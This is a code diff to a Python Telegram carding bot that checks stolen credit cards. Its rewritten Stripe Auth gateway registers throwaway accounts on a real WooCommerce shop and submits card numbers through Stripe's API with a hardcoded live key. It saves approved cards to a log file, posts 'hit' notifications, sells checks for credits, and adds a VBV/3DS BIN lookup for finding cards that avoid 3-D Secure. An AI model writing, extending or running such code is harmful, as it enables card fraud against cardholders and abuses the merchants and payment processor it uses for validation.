@@ -23996,7 +23996,8 @@ async def send_hit_notification(context: ContextTypes.DEFAULT_TYPE,
                                 price: str, 
                                 user: dict,
                                 bin_info: tuple = None,
-                                status_category: str = "charged"):
+                                status_category: str = "charged",
+                                price_override: str = None):
     """Send hit notification with BLADESARKS button to the configured group"""
     
     if not HIT_NOTIFICATION_ENABLED:
@@ -24069,12 +24070,15 @@ async def send_hit_notification(context: ContextTypes.DEFAULT_TYPE,
         "lock": "5197288647275071607",
     }
     
-    try:
-        price_float = float(price.replace('$', '').replace('₹', ''))
-        # Dollar sign at the END, e.g. 0.99$
-        price_display = f"{price_float:.2f}$"
-    except:
-        price_display = price
+    if price_override is not None:
+        price_display = price_override
+    else:
+        try:
+            price_float = float(price.replace('$', '').replace('₹', ''))
+            # Dollar sign at the END, e.g. 0.99$
+            price_display = f"{price_float:.2f}$"
+        except:
+            price_display = price
     
     # Clean the response text — strip trailing "$ 🔥" and price
     clean_response = str(response).strip()
@@ -24405,7 +24409,6 @@ async def auto_detect_reply_with_command(update: Update, context: ContextTypes.D
         '/btnm': ('braintree', True),
         '/pfmc': ('payflow', True),
         '/mad': ('adyen', True),
-        '/mchk': ('auto_stripe', True),
         '/mstc': ('stripe_charge', True),
     }
     
@@ -58201,225 +58204,136 @@ import asyncio
 import traceback
 from datetime import datetime
 
+# ============ STRIPE AUTH GATEWAY (new) ============
 # Active tasks for Stripe Auth (chk)
 stripe_auth_chk_active_tasks = {}
 
-# ============ CONFIGURATION ============
-CHK_REQUEST_TIMEOUT = 15
-
-CHK_SITES = [
-    "https://www.oliveadot.com",
-    "https://dice-heads.com",
-]
-
-CCN_WRONG_REGEX = [re.compile(p, re.I) for p in (
-    r"incorrect[_ ]cvc", r"cvc[_ ]check:\s*fail", r"invalid[_ ]cvc",
-    r"cvv[_ ]decline", r"declined[_ ]cvv", r"wrong[_ ]cvc", r"cvc[_ ]failure",
-    r"cvv[_ ]check:\s*incorrect", r"card's security code is incorrect",
-    r"the cvc code is incorrect", r"cvc mismatch", r"security code incorrect",
-    r"cvc does not match", r"security code is invalid", r"invalid security code",
-)]
-
-CVV_APPROVED_REGEX = [re.compile(p, re.I) for p in (
-    r"succeeded", r"success", r"payment method added", r"authorized", r"approved",
-    r"completed", r"processed", r"payment successful", r"added successfully",
-    r"card added successfully", r"payment method added successfully",
-)]
-
-_BILLING = [
-    {"postcode": "1000", "country": "PH"},
-    {"postcode": "1100", "country": "PH"},
-    {"postcode": "1200", "country": "PH"},
-    {"postcode": "1600", "country": "PH"},
-    {"postcode": "6000", "country": "PH"},
-]
-
-_CHK_UA = (
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
-    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
-)
-
-# ============ HELPER FUNCTIONS ============
-
-def _parse_between(data, start, end):
-    try:
-        i = data.index(start) + len(start)
-        return data[i:data.index(end, i)]
-    except (ValueError, IndexError):
-        return None
+STRIPE_AUTH_SITE = "https://shop.wiseacrebrew.com"
+STRIPE_AUTH_LOG_DIR = data_path("FTXLOG")
 
 
-def _extract_pk(html):
-    if not html:
-        return None
-    for pat in (r"pk_live_[A-Za-z0-9]{24,}", r"pk_test_[A-Za-z0-9]{24,}", r"pk_(?:live|test)_[A-Za-z0-9_]+"):
-        m = re.search(pat, html)
-        if m:
-            return m.group(0)
-    return None
+async def stripe_check(card: str) -> Dict:
+    """
+    Stripe Auth check via WooCommerce "Add Payment Method" (create+confirm SetupIntent).
 
+    card format: 4242424242424242|12|2025|123
+    return: {"status": "APPROVED"/"DECLINED", "text": "Response text", "bin": "424242"}
 
-def _detect_status(msg):
-    if not msg:
-        return "DECLINED"
-    for p in CVV_APPROVED_REGEX:
-        if p.search(msg):
-            return "CVV_APPROVED"
-    for p in CCN_WRONG_REGEX:
-        if p.search(msg):
-            return "CCN_APPROVED"
-    return "DECLINED"
+    If the card is APPROVED it is appended to FTXLOG/stripeautu.txt.
+    """
 
+    def sync_stripe(card):
+        parts = card.split("|")
+        n, mm, yy, cvc = parts[0], parts[1], parts[2][-2:], parts[3]
 
-def _is_card_response(msg):
-    if _detect_status(msg) != "DECLINED":
-        return True
-    ml = msg.lower()
-    return any(k in ml for k in (
-        "card", "invalid", "declined", "insufficient", "expired", "cvc",
-        "security", "incorrect", "wrong", "fraud", "stolen", "restricted",
-        "honor", "limit",
-    ))
+        r = requests.Session()
+        user = generate_user_agent()
 
+        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=15))
+        email = f"{username}@gmail.com"
 
-def _check_on_site(site_url, cc, mm, yy, cvv):
-    """Check card on a single site"""
-    session = requests.Session()
-    billing = random.choice(_BILLING)
-    headers = {
-        "User-Agent": _CHK_UA,
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.5",
-    }
+        # WooCommerce register nonce
+        try:
+            rd = r.get(f'{STRIPE_AUTH_SITE}/account/add-payment-method/',
+                       cookies=r.cookies,
+                       headers={'user-agent': user}).text.split('name="woocommerce-register-nonce" value="')[1].split('"')[0]
+        except:
+            rd = ""
 
-    page = session.get(
-        f"{site_url}/my-account/add-payment-method/",
-        headers=headers,
-        timeout=CHK_REQUEST_TIMEOUT,
-    )
-    if page.status_code != 200:
-        return "error", f"HTTP {page.status_code}", "site_error"
+        # Register
+        try:
+            r.post(f'{STRIPE_AUTH_SITE}/account/add-payment-method/',
+                   headers={'user-agent': user},
+                   data={'email': email,
+                         'password': 'karar1111',
+                         'woocommerce-register-nonce': rd,
+                         '_wp_http_referer': '/my-account/add-payment-method/',
+                         'register': 'Register'})
+        except:
+            pass
 
-    pk = _extract_pk(page.text)
-    if not pk:
-        return "error", "Stripe PK not found", "site_error"
+        # SetupIntent nonce
+        try:
+            rei = r.get(f'{STRIPE_AUTH_SITE}/account/add-payment-method/',
+                        headers={'user-agent': user}).text.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
+        except:
+            rei = ""
 
-    nonce = _parse_between(page.text, '"createAndConfirmSetupIntentNonce":"', '"')
-    if not nonce:
-        m = re.search(
-            r'woocommerce_tokenization_form_params = {.*?"nonce":"([^"]+)"',
-            page.text, re.DOTALL,
-        )
-        nonce = m.group(1) if m else None
-    if not nonce:
-        return "error", "Setup nonce not found", "site_error"
+        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2F41ba105bc6%3B+stripe-js-v3%2F41ba105bc6%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fshop.wiseacrebrew.com&time_on_page=172686&client_attribution_metadata[client_session_id]=70a646ff-9da9-44eb-9bf9-d73d09557bf0&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=4071ff8f-9008-4386-b999-9a18be48e358&guid=NA&muid=NA&sid=NA&key=pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy&_stripe_version=2024-06-20'
 
-    stripe_data = {
-        "type": "card",
-        "card[number]": cc,
-        "card[cvc]": cvv,
-        "card[exp_year]": yy,
-        "card[exp_month]": mm,
-        "allow_redisplay": "unspecified",
-        "billing_details[address][postal_code]": billing["postcode"],
-        "billing_details[address][country]": billing["country"],
-        "pasted_fields": "number",
-        "payment_user_agent": "stripe.js/41ba105bc6; stripe-js-v3/41ba105bc6; payment-element; deferred-intent&",
-        "referrer": site_url,
-        "time_on_page": str(random.randint(5000, 30000)),
-        "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
-        "client_attribution_metadata[merchant_integration_source]": "elements",
-        "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
-        "client_attribution_metadata[merchant_integration_version]": "2021",
-        "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
-        "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
-        "client_attribution_metadata[elements_session_config_id]": str(uuid.uuid4()),
-        "guid": str(uuid.uuid4()),
-        "muid": str(uuid.uuid4()),
-        "sid": str(uuid.uuid4()),
-        "key": pk,
-        "_stripe_version": "2024-06-20",
-    }
+        # Create payment method
+        try:
+            response_json = r.post('https://api.stripe.com/v1/payment_methods',
+                                   headers={'user-agent': user},
+                                   data=data).json()
+            pm_id = response_json.get('id', '')
+        except:
+            pm_id = ''
+            response_json = {}
 
-    stripe_resp = session.post(
-        "https://api.stripe.com/v1/payment_methods",
-        headers={
-            "accept": "application/json",
-            "content-type": "application/x-www-form-urlencoded",
-            "origin": "https://js.stripe.com",
-            "referer": "https://js.stripe.com/",
-            "user-agent": _CHK_UA,
-        },
-        data=stripe_data,
-        timeout=CHK_REQUEST_TIMEOUT,
-    )
+        # Confirm SetupIntent
+        try:
+            resp = r.post(f'{STRIPE_AUTH_SITE}/',
+                          params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'},
+                          headers={'user-agent': user},
+                          data={'action': 'create_and_confirm_setup_intent',
+                                'wc-stripe-payment-method': pm_id,
+                                'wc-stripe-payment-type': 'card',
+                                '_ajax_nonce': rei})
+            try:
+                resp_json = resp.json()
+            except:
+                resp_json = {"success": False, "data": {}}
+        except:
+            resp_json = {"success": False, "data": {}}
 
-    try:
-        stripe_json = stripe_resp.json()
-    except json.JSONDecodeError:
-        return "error", "Invalid Stripe response", "site_error"
+        # Status
+        if resp_json.get("success") and resp_json.get("data", {}).get("status") == "succeeded":
+            status = "APPROVED"
+            text_resp = "Your Card Successful ✅"
+        else:
+            text_resp = "Card Declined ❌"
+            status = "DECLINED"
+            try:
+                body = resp.text
+            except Exception:
+                body = ""
+            if 'card was declined' in body:
+                text_resp = "Card Declined ❌"
+            elif 'Your card number is incorrect.' in body:
+                text_resp = "Card Number Incorrect ❌"
 
-    pm_id = stripe_json.get("id")
-    if not pm_id:
-        err = stripe_json.get("error", {}).get("message", "Unknown error")
-        if _detect_status(err) == "CCN_APPROVED":
-            return "ccn", err, "ccn"
-        if _is_card_response(err):
-            return "declined", err, "declined"
-        return "error", err, "site_error"
+        # Log approved cards
+        if status == "APPROVED":
+            try:
+                os.makedirs(STRIPE_AUTH_LOG_DIR, exist_ok=True)
+                filename = os.path.join(STRIPE_AUTH_LOG_DIR, "stripeautu.txt")
+                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                line = f"[{timestamp}] {card} => {text_resp}\n"
+                with open(filename, "a", encoding="utf-8") as f:
+                    f.write(line)
+            except:
+                pass
 
-    host = site_url.replace("https://", "").replace("http://", "").split("/")[0]
-    ajax_resp = session.post(
-        f"{site_url}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
-        headers={
-            "accept": "*/*",
-            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "origin": site_url,
-            "referer": f"{site_url}/my-account/add-payment-method/",
-            "user-agent": _CHK_UA,
-            "x-requested-with": "XMLHttpRequest",
-            "authority": host,
-        },
-        data={
-            "action": "create_and_confirm_setup_intent",
-            "wc-stripe-payment-method": pm_id,
-            "wc-stripe-payment-type": "card",
-            "_ajax_nonce": nonce,
-        },
-        timeout=CHK_REQUEST_TIMEOUT,
-    )
+        return {"status": status, "text": text_resp, "bin": n[:6]}
 
-    try:
-        ajax_json = ajax_resp.json()
-    except json.JSONDecodeError:
-        return "error", "Invalid AJAX response", "site_error"
+    # run blocking check in a thread
+    result = await asyncio.to_thread(sync_stripe, card)
+    return result
 
-    if ajax_json.get("success") and ajax_json.get("data", {}).get("status") == "succeeded":
-        return "approved", "Payment method added successfully", "cvv_approved"
-
-    msg = ajax_json.get("data", {}).get("error", {}).get("message", "Card declined")
-    if _detect_status(msg) == "CCN_APPROVED":
-        return "ccn", msg, "ccn"
-    if _is_card_response(msg):
-        return "declined", msg, "declined"
-    return "error", msg, "site_error"
-
-
-# ============ MAIN CHECK FUNCTION ============
 
 async def check_card_stripe_chk(card: str, proxy: str = None, user_id: int = None, max_retries: int = 4) -> Dict:
     """
-    Check card using Stripe Auth WooCommerce gateway
-    Returns: Dict with status, message, etc.
+    Stripe Auth check - NEW WooCommerce add-payment-method gateway.
+    Keeps the same return contract used by /chk and /mchk.
+
+    NOTE: the new gateway does not use a proxy, so `proxy` is accepted for
+    signature compatibility but ignored.
     """
     print(f"\n{'='*80}")
     print(f"💳 [STRIPE CHK] Checking card: {card[:20]}...")
-    if proxy:
-        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
-    else:
-        print(f"🔌 No proxy - direct connection")
     print(f"{'='*80}")
-    
+
     default_result = {
         "status": "error",
         "result": "UNKNOWN_ERROR",
@@ -58429,11 +58343,10 @@ async def check_card_stripe_chk(card: str, proxy: str = None, user_id: int = Non
         "elapsed": 0,
         "price": "$0.00",
         "gateway": "Stripe Auth",
-        "site_used": ""
+        "site_used": STRIPE_AUTH_SITE,
     }
-    
+
     try:
-        # Parse card
         parts = card.split('|')
         if len(parts) != 4:
             return {
@@ -58441,116 +58354,65 @@ async def check_card_stripe_chk(card: str, proxy: str = None, user_id: int = Non
                 "result": "INVALID_FORMAT",
                 "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
                 "status_display": "⚠️ INVALID FORMAT",
-                "status_category": "error"
+                "status_category": "error",
+                "elapsed": 0,
+                "price": "$0.00",
+                "gateway": "Stripe Auth",
+                "site_used": "",
             }
-        
+
         cc, mm, yy, cvv = parts
         cc = re.sub(r"\D", "", cc)
         mm = mm.zfill(2)
         if len(yy) == 2:
             yy = "20" + yy[-2:]
-        
-        # Validate card format
-        if not (13 <= len(cc) <= 19 and 1 <= int(mm) <= 12 and 3 <= len(cvv) <= 4):
+
+        if not (13 <= len(cc) <= 19 and mm.isdigit() and 1 <= int(mm) <= 12 and 3 <= len(cvv) <= 4):
             return {
                 "status": "error",
                 "result": "INVALID_CARD",
                 "message": "Invalid card details",
                 "status_display": "⚠️ INVALID CARD",
-                "status_category": "error"
+                "status_category": "error",
+                "elapsed": 0,
+                "price": "$0.00",
+                "gateway": "Stripe Auth",
+                "site_used": "",
             }
-        
+
         start_time = time.time()
-        
-        # Setup session with proxy if provided
-        session = requests.Session()
-        if proxy:
-            proxy_url = format_proxy(proxy)
-            if proxy_url:
-                session.proxies = {'http': proxy_url, 'https': proxy_url}
-                print(f"🔧 Using proxy: {mask_proxy(proxy_url)}")
-        
-        # Try each site
-        attempted = set()
-        last_msg = "All sites failed"
-        last_code = "site_error"
-        
-        for attempt in range(max_retries):
-            site_url = random.choice(CHK_SITES)
-            n = 0
-            while site_url in attempted and n < len(CHK_SITES) * 2:
-                site_url = random.choice(CHK_SITES)
-                n += 1
-            attempted.add(site_url)
-            site_url = site_url.rstrip("/")
-            
-            print(f"📍 [Attempt {attempt + 1}/{max_retries}] Testing site: {site_url}")
-            
-            try:
-                # Run the synchronous check in thread pool
-                loop = asyncio.get_event_loop()
-                status, msg, code = await loop.run_in_executor(
-                    thread_pool,
-                    _check_on_site,
-                    site_url, cc, mm, yy, cvv
-                )
-                
-                if code != "site_error":
-                    elapsed = time.time() - start_time
-                    
-                    # Map status to our format
-                    if status == "approved":
-                        status_display = "✅ APPROVED"
-                        status_category = "approved"
-                        print(f"✅ APPROVED: {msg}")
-                    elif status == "ccn":
-                        status_display = "✅ CVV LIVE"
-                        status_category = "approved"
-                        print(f"✅ CVV LIVE: {msg}")
-                    elif status == "declined":
-                        status_display = "❌ DECLINED"
-                        status_category = "declined"
-                        print(f"❌ DECLINED: {msg}")
-                    else:
-                        status_display = "⚠️ ERROR"
-                        status_category = "error"
-                        print(f"⚠️ ERROR: {msg}")
-                    
-                    return {
-                        "status": "success" if status_category in ["approved", "declined"] else "error",
-                        "result": status,
-                        "message": msg,
-                        "status_display": status_display,
-                        "status_category": status_category,
-                        "elapsed": elapsed,
-                        "price": "$0.00",
-                        "gateway": "Stripe Auth",
-                        "site_used": site_url,
-                        "code": code
-                    }
-                else:
-                    last_msg = msg
-                    last_code = code
-                    
-            except Exception as e:
-                last_msg = str(e)[:120]
-                print(f"⚠️ Site error: {last_msg}")
-                continue
-        
+        raw = await stripe_check(card)
         elapsed = time.time() - start_time
-        
+
+        if raw.get("status") == "APPROVED":
+            print(f"✅ APPROVED: {raw.get('text')}")
+            return {
+                "status": "success",
+                "result": "approved",
+                "message": raw.get("text", "Your Card Successful ✅"),
+                "status_display": "✅ APPROVED",
+                "status_category": "approved",
+                "elapsed": elapsed,
+                "price": "$0.00",
+                "gateway": "Stripe Auth",
+                "site_used": STRIPE_AUTH_SITE,
+                "code": "cvv_approved",
+            }
+
+        print(f"❌ DECLINED: {raw.get('text')}")
         return {
-            "status": "error",
-            "result": last_code,
-            "message": last_msg,
-            "status_display": "⚠️ ERROR",
-            "status_category": "error",
+            "status": "success",
+            "result": "declined",
+            "message": raw.get("text", "Card Declined ❌"),
+            "status_display": "❌ DECLINED",
+            "status_category": "declined",
             "elapsed": elapsed,
             "price": "$0.00",
             "gateway": "Stripe Auth",
-            "site_used": ""
+            "site_used": STRIPE_AUTH_SITE,
+            "code": "declined",
         }
-        
+
     except Exception as e:
         print(f"❌ Error: {e}")
         traceback.print_exc()
@@ -58561,84 +58423,78 @@ async def check_card_stripe_chk(card: str, proxy: str = None, user_id: int = Non
 # ============ FORMAT RESPONSE ============
 
 def format_stripe_chk_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
-    """Format Stripe CHK response for display"""
+    """Format Stripe Auth CHK response for display."""
     bin_info_text, bank, country, currency_code, country_code = bin_info
-    
-    status_display = result.get("status_display", "⚠️ UNKNOWN")
+
     status_category = result.get("status_category", "unknown")
-    message = result.get("message", "Unknown")
-    elapsed = result.get("elapsed", 0)
-    gateway = result.get("gateway", "Stripe Auth")
-    site_used = result.get("site_used", "")
     price = result.get("price", "$0.00")
-    
-    # Parse card for display
+
+    # Card
     card_parts = card.split('|')
     card_num = card_parts[0] if len(card_parts) > 0 else card
     exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
     exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
     exp_year_short = exp_year[-2:] if len(exp_year) == 4 else exp_year
     cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
-    
-    # Clean message
-    clean_message = message[:100]
-    if len(message) > 100:
-        clean_message += "..."
-    
-    # Format country with flag
-    country_name = country.replace('🌐', '').strip()
-    flag_map = {
-        'USA': '🇺🇸', 'UNITED STATES': '🇺🇸', 'UK': '🇬🇧', 'CANADA': '🇨🇦',
-        'AUSTRALIA': '🇦🇺', 'INDIA': '🇮🇳', 'UAE': '🇦🇪'
-    }
-    country_flag = "🌍"
-    for key, flag in flag_map.items():
-        if key in country_name.upper():
-            country_flag = flag
-            break
-    
-    # Format bank name
-    bank_display = bank if bank != 'N/A' else "Unknown"
-    if len(bank_display) > 25:
-        bank_display = bank_display[:22] + "..."
-    
-    # Determine emoji based on status
-    if status_category == "charged":
-        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
-        status_text = "CHARGED"
-    elif status_category == "approved":
-        if "CVV" in status_display or "LIVE" in status_display:
-            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
-            status_text = "CVV LIVE"
-        else:
-            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
-            status_text = "APPROVED"
+    card_display = f"{card_num}|{exp_month}|{exp_year_short}|{cvv}"
+
+    # Normalized response code + status icon
+    _sc = str(status_category).lower()
+    if _sc == "approved":
+        resp_code = "SUCCESS"
+        resp_icon = premium_emoji(PREMIUM_EMOJI_IDS.get("approved", "6266787022111773140"), "✅")
+    elif _sc == "declined":
+        resp_code = "CARD_DECLINED"
+        resp_icon = premium_emoji(PREMIUM_EMOJI_IDS.get("declined", "6267039884016358504"), "❌")
     else:
-        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
-        status_text = "DECLINED"
-    
-    # Build output
+        resp_code = "ERROR"
+        resp_icon = premium_emoji(PREMIUM_EMOJI_IDS.get("error", "6282641460093260838"), "⚠️")
+
+    # Price -> "2.51$"
+    try:
+        price_str = f"{float(str(price).replace('$', '').replace('£', '').strip()):.2f}$"
+    except (ValueError, TypeError):
+        price_str = f"{price}$"
+
+    # Bank
+    bank_display = bank if bank and bank != 'N/A' else "Unknown"
+    if len(bank_display) > 30:
+        bank_display = bank_display[:27] + "..."
+
+    # Country (keep flag if already present)
+    country_name = str(country).replace('🌐', '').strip() or "Unknown"
+    if any(0x1F1E6 <= ord(ch) <= 0x1F1FF for ch in country_name):
+        country_display = country_name
+    else:
+        flag_map = {
+            'USA': '🇺🇸', 'UNITED STATES': '🇺🇸', 'UK': '🇬🇧', 'UNITED KINGDOM': '🇬🇧',
+            'CANADA': '🇨🇦', 'AUSTRALIA': '🇦🇺', 'INDIA': '🇮🇳', 'UAE': '🇦🇪',
+        }
+        flag = "🌍"
+        upper_country = country_name.upper()
+        for k, v in flag_map.items():
+            if k in upper_country:
+                flag = v
+                break
+        country_display = f"{flag} {country_name}"
+
     ui = (
-        f"┏━━━━━━━⍟\n"
-        f"┃ {status_emoji} {status_text}\n"
-        f"┗━━━━━━━━━━━⊛\n\n"
-        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card_num}|{exp_month}|{exp_year_short}|{cvv}</code>\n"
-        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ {gateway}\n"
-        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price}\n"
-        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {clean_message}\n"
-        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
-        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank_display}\n"
-        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
-        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
+        f"<b>Stripe Auth</b> {premium_emoji('5895770017458294953', '💫')}\n\n"
+        f"{premium_emoji('5893494861612455015', '⭐️')} 𝗖𝗔𝗥𝗗 ↣ <code>{card_display}</code>\n\n"
+        f"{resp_icon} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ↣ <code>{resp_code}</code>\n"
+        f"{premium_emoji('6039802097916974085', '🪙')} 𝗣𝗿𝗶𝗰𝗲 ↣ <b>{price_str}</b>\n\n"
+        f"{premium_emoji('5902242339899838759', '🌐')} 𝗕𝗜𝗡 ↣ <b>{bin_info_text}</b>\n"
+        f"{premium_emoji('6041705726206808304', '🚀')} 𝗕𝗮𝗻𝗸 ↣ <b>{bank_display}</b>\n"
+        f"{premium_emoji('5904542823167824187', '🗑')} 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↣ <b>{country_display}</b>"
     )
-    
+
     return ui, status_category
 
 
 # ============ SINGLE CHECK COMMAND ============
 
 @check_gateway("stripe_chk")
-async def single_check_stripe_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def single_check_stripe_chk(update: Update, context: ContextTypes.DEFAULT_TYPE, skip_credit: bool = False):
     """Single card check with Stripe Auth gateway - /chk <card>"""
 
     # ============ BAN CHECK ============
@@ -58686,12 +58542,14 @@ async def single_check_stripe_chk(update: Update, context: ContextTypes.DEFAULT_
         return  # no credits touched
 
     # ============ STEP 2: DEDUCT CREDITS ============
-    can_proceed, error_msg = await check_and_deduct_credits(
-        user_id, update, context, is_mass_check=False, card_count=1
-    )
-    if not can_proceed:
-        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
-        return
+    # skip_credit=True when the caller (reply router) already deducted.
+    if not skip_credit:
+        can_proceed, error_msg = await check_and_deduct_credits(
+            user_id, update, context, is_mass_check=False, card_count=1
+        )
+        if not can_proceed:
+            await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+            return
 
     stripe_auth_chk_active_tasks[user_id] = True
 
@@ -58865,7 +58723,7 @@ async def mass_check_stripe_chk_command(update: Update, context: ContextTypes.DE
                 return
                 
             await message.delete()
-            await mass_check_stripe_chk_logic(update, context, cards, None)
+            asyncio.create_task(mass_check_stripe_chk_logic(update, context, cards, None))
             return
             
         except Exception as e:
@@ -58915,7 +58773,8 @@ async def mass_check_stripe_chk_command(update: Update, context: ContextTypes.DE
     except:
         pass
     
-    await mass_check_stripe_chk_logic(update, context, cards, None)
+    # Run in the background so a big batch never blocks the bot
+    asyncio.create_task(mass_check_stripe_chk_logic(update, context, cards, None))
 
 
 # ============ MASS CHECK LOGIC ============
@@ -77467,7 +77326,7 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         await update.message.reply_text("✅ Processing cancelled.")
         return True
 
-    command = command_text.lower().split()[0] if command_text else ''
+    command = command_text.lower().split()[0].split('@')[0] if command_text else ''
 
     # ══════════════════════════════════════════════════════════════════════
     # ── SPECIAL: /stco and /co expect a URL + card ───────────────────────
@@ -77493,6 +77352,30 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
                 parse_mode=ParseMode.HTML
             )
             return True
+
+    # ══════════════════════════════════════════════════════════════════════
+    # ── SPECIAL: /vbv in reply — VBV/3DS lookup from the replied card ────
+    #  Reply to a card with /vbv → run the local VBV database lookup.
+    #  Handled here (like /stco) because /vbv is not in the gateway_map and
+    #  the group-0 CommandHandler does not run for reply commands.
+    # ══════════════════════════════════════════════════════════════════════
+    if command == '/vbv' or command.startswith('/vbv@'):
+        user_args = command_text.split()
+        context.args = user_args[1:]          # drop "/vbv", keep any inline card
+        await vbv_command(update, context)
+        return True
+
+    # ══════════════════════════════════════════════════════════════════════
+    # ── SPECIAL: /addvbv in reply — bulk VBV entries from the replied
+    #  text or .txt file (owner-only; the command enforces that itself).
+    #  Handled here because the group-0 CommandHandler does not run for
+    #  reply commands, so a replied file would otherwise be ignored.
+    # ══════════════════════════════════════════════════════════════════════
+    if command == '/addvbv' or command.startswith('/addvbv@'):
+        user_args = command_text.split()
+        context.args = user_args[1:]          # drop "/addvbv", keep any inline
+        await addvbv_command(update, context)
+        return True
 
     # ══════════════════════════════════════════════════════════════════════
     # ── SPECIAL: /gift in reply — gift the replied-to user ───────────────
@@ -77969,7 +77852,7 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
 
         elif gateway == 'stripe_chk':
             context.args = [card]
-            asyncio.create_task(single_check_stripe_chk(update, context))
+            asyncio.create_task(single_check_stripe_chk(update, context, skip_credit=True))
 
         elif gateway == 'stripe_pl':
             context.args = [card]
@@ -85736,6 +85619,457 @@ async def mass_check_st1_charge_logic(update: Update, context: ContextTypes.DEFA
 
 
 
+# ═══════════════════════════════════════════════════════════════════════════
+#  VBV / 3DS LOOKUP  —  /vbv  (single check, local BIN database)
+#
+#  Reads <DATA_DIR>/vbvbin.txt — lines of `BIN|status|response` — and reports
+#  the stored 3DS result for the card's first 6 digits.
+#
+#  Improvements over the original file-only lookup:
+#    • tolerant parser (skips blank/comment/malformed lines — never crashes)
+#    • mtime-cached DB (fast repeated lookups)
+#    • fail-closed verdict: only an explicit pass marker counts as PASSED
+#    • handles every card format the bot already understands + reply support
+#    • BIN metadata (brand/bank/country) via the bot's own get_bin_info()
+#    • free-tier credit gate, premium/ultimate unlimited
+#    • owner-only /addvbv and /rmvbv to maintain the database (atomic writes)
+# ═══════════════════════════════════════════════════════════════════════════
+
+VBV_DB_FILENAME  = "vbvbin.txt"
+VBV_CREDIT_COST  = 1                 # credits charged to free-tier users
+VBV_MAX_DB_BYTES = 25 * 1024 * 1024  # sanity cap when loading the DB
+
+# Verdict markers — checked case-insensitively. FAIL markers win, so a stored
+# status such as "3D TRUE ❌" is always REJECTED. Anything that matches no
+# PASS marker is REJECTED (fail-closed). Tweak these two tuples if your DB
+# uses different wording.
+VBV_PASS_MARKERS = (
+    "3d true ✅", "3d pass", "3d-pass", "passed", "pass ✅", "pass✅",
+    "approved", "success", "charged", "live", "vbv pass",
+)
+VBV_FAIL_MARKERS = (
+    "3d true ❌", "3d false", "❌", "fail", "reject", "decline", "declined",
+    "otp", "challenge", "not enrolled", "unsupported", "error", "blocked",
+    "timeout", "expired",
+)
+
+_vbv_cache = {"path": None, "mtime": None, "map": {},
+              "valid": 0, "malformed": 0, "dupes": 0}
+
+
+def _vbv_db_path() -> Path:
+    """Locate the VBV BIN database (DATA_DIR, then DATA_DIR/FILES)."""
+    candidates = [
+        data_path(VBV_DB_FILENAME),
+        data_path("FILES") / VBV_DB_FILENAME,
+        data_path("vbv") / VBV_DB_FILENAME,
+    ]
+    for c in candidates:
+        try:
+            if c.exists():
+                return c
+        except Exception:
+            continue
+    return candidates[0]
+
+
+def _vbv_classify(status: str) -> str:
+    """Return 'pass' or 'reject'. Fail-closed."""
+    s = (status or "").strip().lower()
+    if not s:
+        return "reject"
+    for m in VBV_FAIL_MARKERS:
+        if m in s:
+            return "reject"
+    for m in VBV_PASS_MARKERS:
+        if m in s:
+            return "pass"
+    return "reject"
+
+
+def _vbv_load_db(force: bool = False) -> dict:
+    """Load + cache the DB. First matching line wins per BIN (as before)."""
+    path = _vbv_db_path()
+    try:
+        mtime = path.stat().st_mtime if path.exists() else None
+    except Exception:
+        mtime = None
+
+    if (not force and _vbv_cache["path"] == str(path)
+            and _vbv_cache["mtime"] == mtime):
+        return _vbv_cache
+
